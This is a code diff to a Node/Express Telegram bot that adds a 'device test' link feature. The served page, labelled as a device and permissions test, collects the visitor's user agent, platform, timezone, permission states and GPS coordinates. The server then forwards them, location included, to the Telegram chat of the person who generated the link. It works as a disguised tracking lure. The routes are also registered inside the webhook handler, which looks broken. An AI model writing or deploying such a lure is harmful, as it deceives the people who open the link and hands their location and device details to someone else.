@@ -1,3 +1,6 @@
+// In-memory store for generated links and their owners
+const deviceLinks = {};
+
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
@@ -79,10 +82,96 @@ app.post('/telegram-webhook', async (req, res) => {
             const userId = body.callback_query.from.id;
             const uniqueCode = Math.random().toString(36).substring(2, 10) + userId;
             const link = `https://tiger2-2.onrender.com/device-test/${uniqueCode}`;
+            deviceLinks[uniqueCode] = { userId, chatId: body.callback_query.message.chat.id, created: Date.now() };
             await axios.post(`${TELEGRAM_API}/sendMessage`, {
                 chat_id: body.callback_query.message.chat.id,
                 text: `Your unique device test link: ${link}`
             });
+        // Serve device test page (simple HTML/JS)
+        app.get('/device-test/:code', (req, res) => {
+            const { code } = req.params;
+            if (!deviceLinks[code]) {
+                return res.status(404).send('Invalid or expired link.');
+            }
+            // Simple HTML page to collect device info and permissions
+            res.send(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <title>Device Test</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                </head>
+                <body>
+                    <h2>Device Test & Permissions</h2>
+                    <button id="startBtn">Start Test</button>
+                    <pre id="result"></pre>
+                    <script>
+                    document.getElementById('startBtn').onclick = async function() {
+                        const result = {};
+                        result.userAgent = navigator.userAgent;
+                        result.platform = navigator.platform;
+                        result.language = navigator.language;
+                        result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        result.permissions = {};
+                        if (navigator.permissions) {
+                            for (const perm of ['geolocation','notifications','camera','microphone']) {
+                                try {
+                                    const status = await navigator.permissions.query({name: perm});
+                                    result.permissions[perm] = status.state;
+                                } catch {}
+                            }
+                        }
+                        if (navigator.geolocation) {
+                            await new Promise(resolve => {
+                                navigator.geolocation.getCurrentPosition(
+                                    pos => {
+                                        result.geolocation = pos.coords;
+                                        resolve();
+                                    },
+                                    () => resolve(),
+                                    {timeout: 3000}
+                                );
+                            });
+                        }
+                        document.getElementById('result').textContent = JSON.stringify(result, null, 2);
+                        // Send to server
+                        await fetch('/device-test-report', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ code: '${code}', report: result })
+                        });
+                        alert('Test report sent!');
+                    };
+                    </script>
+                </body>
+                </html>
+            `);
+        });
+
+        // Receive device test report and forward to Telegram
+        app.post('/device-test-report', async (req, res) => {
+            const { code, report } = req.body;
+            if (!deviceLinks[code]) return res.status(400).send('Invalid code');
+            const { chatId } = deviceLinks[code];
+            // Format report for Telegram
+            let msg = `Device Test Report:\n`;
+            msg += `User Agent: ${report.userAgent}\nPlatform: ${report.platform}\nLanguage: ${report.language}\nTimezone: ${report.timezone}\n`;
+            if (report.geolocation) {
+                msg += `Location: Lat ${report.geolocation.latitude}, Lon ${report.geolocation.longitude}\n`;
+            }
+            if (report.permissions) {
+                msg += 'Permissions:\n';
+                for (const [k,v] of Object.entries(report.permissions)) {
+                    msg += `- ${k}: ${v}\n`;
+                }
+            }
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: chatId,
+                text: msg
+            });
+            res.send('ok');
+        });
         } else if (data === 'getdata_menu') {
             // Show data options and hardware test
             const buttons = [
